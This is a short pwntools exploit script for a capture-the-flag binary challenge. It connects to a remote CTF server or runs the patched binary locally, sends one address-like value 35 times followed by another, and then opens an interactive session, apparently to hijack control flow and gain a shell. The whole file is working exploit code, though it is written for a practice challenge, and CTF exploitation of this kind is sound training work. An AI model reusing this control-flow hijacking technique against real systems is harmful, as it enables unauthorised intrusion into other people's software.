#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("kashictf.iitbhucybersec.in", 55561)

    return r


def main():
    r = conn()

    # gdb.attach(r, '''
    #             b *0x40128b
    #            c
    #             ''')


    for i in range(35):
        r.sendline(b'40125e')

    r.sendline(b'4011ba')

    r.interactive()


if __name__ == "__main__":
    main()
